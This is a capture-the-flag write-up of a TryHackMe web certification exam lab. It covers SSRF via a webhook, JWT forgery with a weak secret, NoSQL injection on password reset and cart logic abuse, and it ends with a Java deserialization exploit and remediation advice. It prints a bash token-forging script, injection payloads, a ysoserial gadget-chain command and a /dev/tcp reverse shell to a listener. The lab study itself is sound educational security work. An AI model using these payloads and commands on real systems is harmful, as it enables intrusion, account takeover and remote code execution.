---
title: 'ZeroDay Supply: the WEB1 practical exam'
date: 2026-09-07
summary: "The practical exam for TryHackMe's WEB1 certification: a black-box HR portal, a grey-box Flask/MongoDB e-commerce API behind a React SPA, and a white-box Spring Boot config tool. The API hid five vulnerability classes — SSRF via a webhook response-merge bug, a weak JWT signing secret, NoSQL operator injection, and a hidden cart-update endpoint with broken business logic, plus a fifth (command injection) that resisted every technique tried — while source review of the third host surfaced an insecure-deserialization RCE to root via a Commons Collections gadget chain."
tags: ['WEB1', 'SSRF', 'JWT', 'NoSQL Injection', 'MongoDB', 'Business Logic', 'Mass Assignment', 'API Security', 'React', 'Flask', 'Insecure Deserialization', 'Java', 'Spring Boot', 'ysoserial', 'RCE']
draft: false
---

This lab sat on a private VPN network (`10.200.150.0/24`) and put two boxes in
front of me: a small Flask-based HR portal at `10.200.150.151` ("Helix HR")
and a much larger target at `10.200.150.100`, a Flask/MongoDB e-commerce API
called "ZeroDay Supply" sitting behind a React single-page app. Each box hid a
fixed number of flags — `THM{<uuid>}` — behind distinct web-vulnerability
classes, and the brief was a straight black-box assessment: find and exploit
as many as possible.

This run is one instance of a recurring private lab whose vulnerability menu
and target IPs are randomised per spin-up, so nothing here is a fixed answer
key for a future run — it's a record of one specific instance's five classes
and everything that was ruled out getting there.

## Helix HR — session/OTP brute force

Helix HR was the smaller of the two boxes: a Flask HR portal with a
password-reset flow. The reset form only exposed an email field on its face,
but `ffuf` fuzzing against the request body turned up a hidden `code`
parameter the frontend never sent — a one-time password gating the reset.

The OTP was four digits. With no rate limiting on the confirm endpoint, a
straight brute force of all `0000`-`9999` values against a triggered reset
recovered the code, completed the reset, and logged in to retrieve the flag:

```
THM{c73b773e-0ac8-49f5-be85-0941d33e8b81}
```

The lesson that carried into the second box: fuzz for hidden parameters
early, on every form, before assuming a field set is complete. It paid off
again later.

## ZeroDay Supply — mapping the API

ZeroDay Supply's frontend is a React SPA talking to a JSON REST API under
`/api/*`, authenticated with a Bearer JWT (`POST /api/auth/login` with
`{"email","password"}` returns `{"token"}`). Rather than fuzz blind, the
fastest way to a complete endpoint map was reading the built React bundle
(`bundle.js`) directly — every Axios call the frontend makes is right there
in the minified source, e.g.:

```js
async function Mc(e,t){let{data:n}=await bc.post('/api/cart/add',{product_slug:e,quantity:t});return n.cart}
```

That gave a documented baseline, which live probing (every HTTP verb against
every discovered route, following the "test every verb, not every resource"
habit from prior engagements) then extended and confirmed:

| Endpoint | Method | Notes |
|---|---|---|
| `/api/auth/login` | POST | issues JWT |
| `/api/auth/register` | POST | |
| `/api/auth/me` | GET | **flag-bearing** — returns `ctf_flag` only for `role:admin` |
| `/api/auth/password-reset/request` | POST | leaks reset token in plaintext response (flagged by the app itself as "not a valid vulnerability" — out of scope by design) |
| `/api/auth/password-reset/confirm` | POST | **NoSQL injection flag** |
| `/api/products` | GET | |
| `/api/products/{slug}` | GET | |
| `/api/products` | POST | admin create |
| `/api/products/{slug}` | PUT | admin update — **unrestricted mass-assignment** |
| `/api/cart` | GET | |
| `/api/cart/add` | POST | documented, hardened |
| `/api/cart/update` | PUT | **hidden, weaker validation — business-logic flag** |
| `/api/cart/remove` | DELETE | |
| `/api/orders/checkout` | POST | |
| `/api/orders` | GET | |
| `/api/orders/{id}` | GET | ownership-checked |
| `/api/orders/{id}/invoice` | GET | PDF, wkhtmltopdf 0.12.6 |
| `/api/orders/export` | GET | CSV, minimal columns |
| `/api/orders/admin/all` | GET | admin-only |
| `/api/orders/{id}/status` | PUT | admin-only |
| `/api/profile` | GET / PUT | |
| `/api/profile/avatar` | POST | |
| `/api/webhooks/url` | PUT | **SSRF flag** |
| `/api/webhooks/test` | POST | |

A large `ffuf` wordlist sweep beyond this list mostly turned up noise — dozens
of `/api-docs`, `/swagger.json`, `/v1/*` style hits that all resolved to the
React SPA's `index.html` fallback (a uniform ~689-byte response), including
some paths (`/api/products/import`, `/bulk`, `/bulk-import`) that looked like
hidden admin routes but were confirmed false positives once a nonsense slug
produced identical 404/405 behaviour on the same generic `/api/products/<slug>`
route.

## Flag 1 — SSRF via a webhook response-merge bug

`PUT /api/webhooks/url` lets a user store a callback URL, and
`POST /api/webhooks/test` makes the server fetch it and report back
`status_code`/`success`. Early probing pointed the webhook at a listener that
replied with plain text, and the test response showed nothing beyond
`status_code`/`success` — which looked like a dead end (no content echo
capability), but was actually a false negative: the endpoint **only merges
the fetched body into its own JSON response when that body parses as valid
JSON**.

Once a listener replied with actual JSON, the merge showed up immediately.
Sweeping internal hosts/ports on the loopback/RFC1918 ranges the app could
reach turned up a service on `127.0.0.1:8080` — an internal flag endpoint
with no other route in:

```
PUT /api/webhooks/url   {"url":"http://127.0.0.1:8080/flag"}
POST /api/webhooks/test
```

The fetched body, `{"ctf_flag":"THM{...}"}`, was merged straight into the
webhook-test response:

```
THM{e9dd13fc-9180-4b22-96e3-d8ab24ad431b}
```

**Attack path:** authenticate as any user → set an internal URL as the
webhook target → trigger the test → read the server's own fetch of an
internal-only service back out through the JSON merge. No direct network
access to the internal service is required at any point — the vulnerable
server does the fetching.

### The rate-limiting trap while scanning internally

Sweeping internal ports through the same webhook-test endpoint eventually
tripped a **global rate limit** on `/api/webhooks/test`. Past that point,
*every* target — including known-good ones like `127.0.0.1:80`, which
reliably returned a `405` under normal conditions — started coming back as a
generic `WEBHOOK_ERROR`. That silently invalidated an entire earlier fast
port sweep: hosts that were actually reachable looked identical to hosts that
weren't, because the rate-limit response and the "genuinely unreachable"
response were indistinguishable.

The fix was slowing down rather than debugging harder: a short cooldown
wasn't enough, so scanning paused for a few hours, then resumed at roughly
7-8 seconds between requests. At that pace the responses differentiated
cleanly again. The general lesson: when a blind oracle like this stops giving
useful signal mid-sweep, check whether a previously-good control target still
behaves correctly before trusting a run of negative results — a rate limit
can look exactly like "nothing here."

## Flag 2 — weak JWT signing secret

The JWT is HS256 with a payload shaped like:

```json
{"sub":"<24-char-hex-ObjectId>","user_id":<int>,"email":"...","role":"admin|customer","exp":...,"iat":...,"jti":"<uuid>"}
```

The signing secret turned out to be the literal string `secret`. With that
confirmed, forging a token for any role/user_id is a two-line HMAC operation:

```bash
b64url(){ openssl base64 -A | tr '+/' '-_' | tr -d '='; }
sign(){
  local h=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | b64url)
  local pb=$(printf '%s' "$1" | b64url)
  local si="$h.$pb"
  local sig=$(printf '%s' "$si" | openssl dgst -sha256 -hmac secret -binary | b64url)
  printf '%s.%s' "$si" "$sig"
}
```

Forging a token with `"role":"admin"` and presenting it to `GET /api/auth/me`
— an endpoint that only reveals a `ctf_flag` field for admin-role tokens —
recovered the flag directly:

```
THM{eb52dd6e-47a5-4259-b274-97d6d9a462ff}
```

**Attack path:** obtain any valid JWT structure (e.g. from a normal login) →
recompute the signature offline with the guessed/weak secret → replace
`role` and re-sign → call an endpoint that branches on role. No password,
no session, no interaction with the real auth flow beyond copying its token
shape.

## Flag 3 — NoSQL injection on password reset

`POST /api/auth/password-reset/confirm` takes a `token` and a new `password`
and, under the hood, uses the token value directly in a MongoDB query rather
than validating its type first. Sending an operator instead of a string
bypasses the check entirely:

```json
{"token": {"$ne": null}, "password": "NewPass123!"}
```

Because `$ne: null` matches *any* document that has a token field at all, this
resets the password of whichever record the query happens to match first —
full unauthenticated account takeover with no valid reset token in hand,
confirmed via the flag surfaced on the resulting session:

```
THM{5e2839e0-11c8-48e3-bd9c-30f22c1416fb}
```

**Attack path:** POST directly to the confirm endpoint with a MongoDB
operator in place of a real token string → the unvalidated query matches
regardless → attacker-chosen password is set on an arbitrary account. The
underlying mistake is trusting a JSON body's shape instead of enforcing that
`token` is a string before it ever reaches the query layer — the exact class
of bug `$ne`/`$regex`/`$nin` injection always targets on a Mongo-backed API.

## Flag 4 (confirmed class, no flag string recovered) — business logic via a hidden cart-update endpoint

`POST /api/cart/add` — the documented, frontend-used endpoint — is properly
hardened: it rejects zero-stock products, rejects negative or oversized
quantities, and ignores any client-supplied price.

Probing every HTTP verb against `/api/cart/*` turned up a second endpoint the
frontend never calls at all — confirmed by an exhaustive grep of `bundle.js`
finding zero references to it anywhere in the built client:

```
PUT /api/cart/update
```

It requires a pre-existing cart entry for the target `product_slug` (a fresh
slug returns `{"error":"VALIDATION_ERROR","message":"Cart not found."}`, so
it's an update-only path, not an upsert), and it correctly rejects a quantity
below 1 — but everything else is looser than `cart/add`. Two concrete order
records prove it:

**Stock-check bypass — order 175** (customer account):

```json
{"items":[{"name":"Exploit Forge Pro Bundle","price":249.99,
  "product_slug":"exploit-forge-pro-bundle","quantity":1}],
 "order_number":175,"total":249.99}
```

`exploit-forge-pro-bundle` independently carries `stock:0`, and `cart/add`
reliably refuses it with "Only 0 units available" — but it went through
`cart/update` cleanly and checked out as a normal order.

**Negative-price injection — order 153** (admin account):

```json
{"items":[{"name":"Ghost Plug X","price":-100,
  "product_slug":"ghost-plug-x","quantity":10}],
 "order_number":153,"total":0.0}
```

Ghost Plug X's real price is 89.99. The stored line-item price is the raw
`-100` supplied on the request — proof the field isn't revalidated
server-side at all — while the order's `total` came back as exactly `0.0`
rather than the mathematically implied `-1000`, showing the server floors
the *computed total* at zero while leaving the *per-item price* completely
unvalidated. In other words, the check that guards `cart/add` was never
ported over to `cart/update` — precisely the "the check is often on the main
controller method and forgotten on the auxiliary ones" pattern from prior
engagements' methodology notes.

**Attack path:** add any in-stock item to the cart normally through
`cart/add` to create the cart row → call the undocumented `cart/update` with
that same `product_slug` and an attacker-chosen `price` and/or a quantity
that exceeds real stock → checkout. The result is either free/negative-cost
merchandise or purchase of an item the storefront itself refuses to sell.

No flag string was ever pulled out of this endpoint's response before VPN
access to the lab closed, but the engagement organiser later confirmed
**business logic** as one of the two vulnerability classes this run
genuinely used — and this cart-update behaviour is unambiguously that class,
fully reproduced with two independent order records even without the literal
flag text.

### A second, related finding: unrestricted mass-assignment on product updates

While chasing the cart-update lead, the admin-only `PUT /api/products/{slug}`
route turned out to have the same shape of problem one layer up: no schema
validation at all, just a raw merge into the MongoDB document. A negative
`price`/`stock` persists as sent, and setting `category` to a MongoDB
operator object (`{"$ne": null}`) stores the literal operator rather than
being coerced to a string — proof of zero type checking on write. The
response after an update also leaked `internal_notes` and `supplier_cost`,
two fields never exposed through the normal `GET` route. This wasn't
attributed to a specific flag, but it's the same missing-validation pattern
as the cart-update bug, one endpoint over, and product state was restored
after confirming it.

## Flag 5 — command injection (never found)

The organiser confirmed **command injection** as the fifth intended class —
but it was never located, despite testing it from five distinct angles, each
with an out-of-band callback listener or timing check to catch a hit that a
purely textual response wouldn't reveal:

- shipping address `full_name` and `city` fields, with backtick/`$()`/pipe/
  `&&`/`sleep` payloads (e.g. `` Testville`sleep 5` ``) — no delay, no
  callback, and the payload came back HTML-escaped in every render path.
- product `name` and `category` fields (admin-created products) — same
  payload set, same result.
- avatar-upload filename — renamed the uploaded file to injection payloads;
  the server always assigns its own UUID filename server-side regardless of
  what the client sends, so there's no path for a client-controlled filename
  to reach a shell context at all.
- `webhook_url` — has strict server-side validation (requires an `https://`
  prefix, rejects any shell metacharacter outright), closing this off before
  a payload could even be stored.
- `coupon_code` at checkout — validated against a fixed set of real codes,
  so an injected string is rejected before it's ever processed further.

Nothing here produced a delay or a callback. The task notes from earlier in
the engagement mention this flag needing "the right access level," which was
never resolved — a role or endpoint beyond plain `customer`/`admin` may be
the missing piece, but the lab's VPN access closed before that could be
chased further.

## Categories tested and ruled out

A lab like this rewards documenting the negative results as carefully as the
positive ones — a missed flag is often hiding in something that was "tested"
too shallowly rather than something never tried at all. Everything below has
concrete evidence behind the negative:

**Stored XSS** — tested across every field that gets persisted and later
rendered:
- shipping-address fields (`full_name`, `address_line1`, `city`,
  `postal_code`, `country`) — HTML-entity-escaped on render, confirmed across
  multiple orders.
- profile `display_name` / `bio` — HTML-entity-encoded on save.
- product `name`, set via the admin create/update endpoints — genuinely
  **not** content-validated at write time (raw `<script>`/`<iframe>`/`<b>`
  strings are accepted and stored as-is), which looked like the strongest
  lead of the whole engagement once it showed up unescaped in downloaded PDF
  invoices generated by wkhtmltopdf 0.12.6, a version with real historical
  XSS/SSRF issues. But direct verification — both the raw invoice JSON *and*
  the actual rendered PDF pixels via `pymupdf` — showed every payload coming
  through as literal, properly escaped, inert text across nine separate test
  orders. The organiser's post-engagement debrief later confirmed stored XSS
  genuinely wasn't one of this run's five classes, which lines up with what
  the evidence showed throughout: an unvalidated input sitting in front of a
  confirmed old renderer is a strong-looking lead, not proof, until an actual
  execution or callback fires.
- CSV export — no item-name column exists at all, so there's no text sink to
  inject into.
- checkout body fields (`notes`, `gift_card_code`, `referral_code`,
  `affiliate_code`, `order_notes`, `customer_notes`, `special_instructions`,
  `comment`) — every one of these is silently dropped as an unrecognised
  field; none persist anywhere in the resulting order object.
- request headers (`User-Agent`, `Referer`, `X-Forwarded-For`) and error
  pages — no reflection anywhere.
- the React bundle itself has zero `.innerHTML =`, `document.write`, or
  `insertAdjacentHTML` call sites; the only `dangerouslySetInnerHTML` in the
  whole bundle belongs to React Router's internal scroll-restoration script,
  not app data.
- Unicode homoglyph brackets and HTML entity double-encoding
  (`&lt;` → `&amp;lt;`, not idempotent) were also tried against the escaping
  layer specifically — both rendered as inert literal text, closing off a
  decode-after-escape bypass.

**Server-side template injection** — four template syntaxes
(`{{7*7}}`, `${7*7}`, `#{7*7}`, `<%=7*7%>`) were sent through shipping
fields, product names, and `display_name`. All four stored and rendered as
literal strings in every case, including directly on a downloaded invoice PDF
(`{{7*7}}` in a shipping field came back as literal `{{7*7}}`, never `49`) —
no template ever evaluated.

**SSRF beyond the webhook** — the invoice PDF has no embedded images to
abuse, and product `images`/`image_url`/`thumbnail_url` fields are silently
ignored rather than fetched server-side, so the only working SSRF vector
stayed the webhook itself.

**Everything else tested with a clear negative:** IDOR on order access
(ownership checks hold, cross-user access returns 403 consistently);
mass-assignment on `cart/add` specifically (price/qty are hard-validated,
unlike its `cart/update` sibling); Content-Type confusion on avatar upload
(nginx enforces the declared extension, and both filename extension *and*
magic bytes are checked — an image's bytes under a `.svg`/`.html` name are
rejected outright); RCE via avatar image processing (uploaded bytes come
back MD5-identical, so nothing decodes or re-encodes them); CORS
misconfiguration (a single hardcoded allowed origin, no reflection against
arbitrary or `null` origins); insecure deserialization (pure Bearer-JWT auth
with no cookies/sessions anywhere, and XML/YAML content types are silently
ignored rather than parsed); JWT `kid`-header injection (the field is
ignored by the verifier entirely); open redirect (no redirect logic exists
in the app to abuse); HTTP/2 request smuggling (confirmed HTTP/1.1 only, no
downgrade path); wkhtmltopdf CLI parameter injection through any field that
reaches the invoice (no timing difference, no callback); a predictable
password-reset token exposed by the reset-request endpoint (explicitly
flagged by the app's own response as "not a valid vulnerability" and treated
as out of scope for this run); the Werkzeug debug console (returns 404, not
enabled); a registration race condition against duplicate emails (produces
unhandled 500s under concurrency, but MongoDB's unique index holds — no
duplicate account is ever created); path traversal via the avatar filename
(the server always assigns its own UUID filename, ignoring whatever the
client sends); XXE (the backend never parses XML regardless of the
declared content type); and CSV injection on the order export (the export
only contains `order_number,status,total,item_count,created_at` — no
user-controlled text field is anywhere near it).

## Retrospective

Three of five ZeroDay Supply flags came from following the API surface
methodically — reading the client bundle for the documented routes, then
testing every verb against every route to find the ones the frontend never
calls. The fourth (business logic) came from exactly that same "test every
verb" habit turning up a completely undocumented endpoint with weaker
validation than its sibling — the flag string itself was lost to the lab's
access window closing, but the vulnerability was fully reproduced with two
independent order records first. The fifth (command injection) is the one
that stings a little: five different injection points, all with proper
out-of-band verification instead of trusting response text alone, and still
nothing — a reminder that a negative result on every *field* tried doesn't
rule out a class if there's an endpoint or access level never reached at
all.

The other durable technique worth keeping: a downloaded PDF carries its own
generator fingerprint in its metadata (`/Creator`, `/Producer`), readable
directly off the file with a library like `pymupdf` or a raw grep of the
bytes — a fast, guess-free way to confirm exactly which rendering engine
produced it before spending time chasing engine-specific bugs against it.

---

## White box testing — ConfigImporter (10.200.150.152)

**Vulnerability: Insecure Deserialization (OWASP A08:2021)**

### Overview

The target host ran a Spring Boot web application called ConfigImporter on
port 8080. The application exposed an `/import` endpoint that accepted file
uploads and passed their raw bytes directly into Java's
`ObjectInputStream.readObject()` without any validation, filtering, or class
allowlisting. Combined with a vulnerable version of Apache Commons
Collections (3.2.1) on the classpath, this allowed a crafted serialized
payload to achieve Remote Code Execution (RCE) on the host, ultimately
exposing `/opt/flag.txt`.

### Step 1 — Network & service enumeration

Initial reconnaissance of the target confirmed host `10.200.150.152` was
active and running a Java-based web application on TCP port 8080.
Fingerprinting the service via HTTP response headers and page content
identified it as a Spring Boot application. The login page presented the
application name **ConfigImporter** along with the description "Internal
operations tool," confirming this was an internal administrative interface
exposed on the network. The presence of Thymeleaf template syntax in the
HTML source (`th:action`, `th:if`) further confirmed the Spring Boot +
Thymeleaf technology stack before any source code was reviewed.

### Step 2 — Reconnaissance & source code review

As part of the white-box engagement scope, access to the application source
tree was provided. Reviewing the key files revealed the following:

- **`pom.xml`** confirmed the full technology stack: Spring Boot 2.7.18,
  Java 8, and critically **Apache Commons Collections 3.2.1** as an explicit
  direct dependency — a version with well-known public gadget chains
  exploitable via `ysoserial`. The presence of `spring-boot-maven-plugin`
  confirmed the application was packaged and run as a self-contained JAR.
- **`SiteConfig.java`** implemented `java.io.Serializable` with a
  `serialVersionUID`, signalling that Java native serialization was actively
  used within the application for the config import/export feature.
- **`ConfigController.java`** confirmed the vulnerable sink — the `/import`
  endpoint called `ObjectInputStream.readObject()` directly on
  attacker-controlled bytes with no `ObjectInputFilter` applied. Critically,
  the `ClassCastException` thrown after gadget chain execution was silently
  swallowed by a broad `catch (Exception legacy)` block that fell through to
  JSON parsing, meaning the attack produced no errors in application logs
  and the server always returned the same generic "Invalid configuration
  file" flash message regardless of whether exploitation succeeded or
  failed.
- **`SecurityConfig.java`** revealed two additional weaknesses — CSRF
  protection was globally disabled via `.csrf(csrf -> csrf.disable())`, and
  application credentials were hardcoded as plaintext environment variable
  fallbacks: `admin` / `THM_C0nfig1mp0rter_0ps!`. These credentials were used
  to authenticate to the application for the remainder of the assessment.
- **`application.yml`** confirmed a 1MB file upload limit was in place,
  which required bypassing before payload delivery, and that DEBUG level
  logging was enabled for the application's own package.

### Step 3 — Authentication & pre-exploitation

Using the credentials recovered from `SecurityConfig.java`, authentication
to the application was completed at `/login`. Once authenticated, the
`/edit` endpoint was used to increase `maxUploadMb` from 1 to 200 via the
legitimate configuration edit form, ensuring the `ysoserial` payload would
not be rejected by the multipart size limit before reaching the
deserialization code. This change was reflected immediately in the
dashboard with a green "Configuration updated" confirmation.

### Step 4 — Attacker interface identification

Before generating the payload, the correct callback IP was established by
checking which local interface was routable to the target:

```bash
ip route get 10.200.150.152
# 10.200.150.152 via 10.250.1.1 dev tun0 src 10.250.1.6
```

The VPN interface `tun0` with address `10.250.1.6` was confirmed as the
correct interface. Using the primary `ens5` interface (`10.48.66.238`) would
have caused the reverse shell to fail silently, as the target cannot route
to that subnet. This distinction was confirmed to be the cause of initial
failed callback attempts during the engagement.

### Step 5 — Payload generation

A netcat listener was started on the attacker machine:

```bash
nc -lvnp 4444
```

The reverse shell command was base64-encoded to avoid shell metacharacter
interpretation issues within the `ysoserial` command argument:

```bash
echo -n 'bash -i >& /dev/tcp/10.250.1.6/4444 0>&1' | base64 -w0
```

The `CommonsCollections6` gadget chain was selected because it is the most
broadly reliable chain against Commons Collections 3.2.1 on Java 8, using
`HashSet` → `TiedMapEntry` → `LazyMap` → `ChainedTransformer` →
`InvokerTransformer` → `Runtime.exec()`. The chain triggers during
`HashSet.readObject()` when it calls `hashCode()` on its elements, which
cascades through the transformer chain and executes the OS command — all
before any type-casting to `SiteConfig` occurs. The `--add-opens` flags were
required because `ysoserial` was running under a modern JDK with JPMS module
restrictions:

```bash
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.net=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 \
     "bash -c {echo,BASE64_ENCODED_REVERSE_SHELL}|{base64,-d}|bash" > shell.bin
```

Payload integrity was verified before upload — `xxd shell.bin | head -3`
confirmed the Java serialization magic bytes `ac ed 00 05` at the start of
the file, and `ls -la shell.bin` confirmed a non-zero file size.

### Step 6 — Payload delivery

The `-X POST` flag was intentionally omitted from the `curl` upload command.
Initial attempts using `-X POST` resulted in `405 Method Not Allowed`
because `curl` was re-sending POST on the 302 redirect to `/`, which the
application correctly rejected. Omitting `-X POST` while using `-F` allows
`curl` to correctly switch to GET when following the redirect:

```bash
curl -F "file=@shell.bin" \
     -H "Cookie: JSESSIONID=<valid_session>" \
     -L http://10.200.150.152:8080/import
```

The server returned the expected 302 redirect with flash message "Invalid
configuration file" — this is cosmetic and expected. The gadget chain
executes during `readObject()` before the `ClassCastException` is thrown and
caught, so the error message does not indicate failure.

### Step 7 — Remote code execution & post-exploitation

The gadget chain fired during deserialization on the server, spawning a
reverse bash shell to the attacker's listener:

```
connect to [10.250.1.6] from (UNKNOWN) [10.200.150.152] 43218
bash: no job control in this shell
root@configimporter:/app$
```

The application process was running as root, meaning no privilege
escalation was required. Immediate post-exploitation enumeration was
performed to establish context:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

uname -a
# Linux configimporter 5.15.0 #1 SMP x86_64 GNU/Linux

env
# Revealed runtime environment variables and any additional secrets

find /app -name "*.yml" -o -name "*.properties"
# Located all application configuration files for further review
```

The flag was retrieved from the location indicated in the engagement scope:

```bash
cat /opt/flag.txt
# THM{...}
```

Although not actioned within this engagement's scope, the root-level shell
provided access to persistence mechanisms including SSH key injection, cron
job installation, and modification of adjacent network hosts reachable from
the compromised container.

### Root cause summary

| Misconfiguration | Impact |
|---|---|
| `ObjectInputStream.readObject()` on untrusted input with no `ObjectInputFilter` | Arbitrary gadget chain execution → RCE |
| Commons Collections 3.2.1 on classpath | Provided `CommonsCollections6` gadget chain |
| Credentials hardcoded with plaintext fallbacks in source | Authenticated access without prior knowledge |
| CSRF disabled globally | Removed cross-origin request protection layer |
| Silent `catch (Exception)` around deserialization | Attack masked from error logs entirely |
| Application running as root | No privilege escalation required post-RCE |

### Remediation

- **Replace unsafe deserialization entirely.** The `/import` endpoint's
  legitimate purpose — re-importing a previously exported config — is fully
  achievable using the JSON fallback path already present in the code. The
  `ObjectInputStream.readObject()` call should be removed completely. If
  Java serialization is genuinely required elsewhere, apply a strict
  `ObjectInputFilter` that allowlists only `SiteConfig` and primitive types,
  rejecting everything else by default.
- **Upgrade Apache Commons Collections from 3.2.1 to 4.4.** Version 3.2.2
  patches the `InvokerTransformer` serialization issue specifically, however
  migrating to 4.4 is strongly recommended as it restructures the library to
  be safe by default and receives active maintenance. Note that upgrading
  the library alone is insufficient if `readObject()` on untrusted input
  remains — both remediations must be applied together.
- **Remove hardcoded credential fallbacks.** The
  `getOrDefault("OPS_PASS", "THM_C0nfig1mp0rter_0ps!")` pattern means the
  application runs with known-plaintext credentials if the environment
  variable is not explicitly set. Replace with a mandatory check that
  prevents application startup if the variable is absent, and store
  credentials in a dedicated secrets manager rather than environment
  variables.
- **Re-enable CSRF protection.** The global `.csrf(csrf -> csrf.disable())`
  removes a meaningful layer of defence for all state-changing endpoints.
  Re-enable CSRF with `CookieCsrfTokenRepository` and ensure the import
  endpoint requires a valid CSRF token on every POST request.
- **Run the application as a non-root service account.** The process
  running as root meant that successful RCE immediately yielded full system
  control with no further steps required. A dedicated low-privilege service
  account with filesystem access restricted to the application directory
  limits the blast radius of any future exploitation to the application's
  own scope.
- **Log deserialization failures as security events.** The broad
  `catch (Exception legacy)` block silently discarded the attack. Replace
  with specific exception handling that logs `InvalidClassException` and
  `ClassNotFoundException` at WARN or ERROR level with the offending class
  name, enabling detection and alerting on exploitation attempts.
- **Reject serialized Java object uploads at the boundary.** Add a file
  content check before any parsing occurs — Java serialization streams
  always begin with magic bytes `0xAC 0xED`. Rejecting any upload whose
  first two bytes match this signature provides defence-in-depth even if the
  `ObjectInputStream` call is accidentally reintroduced in a future code
  change.
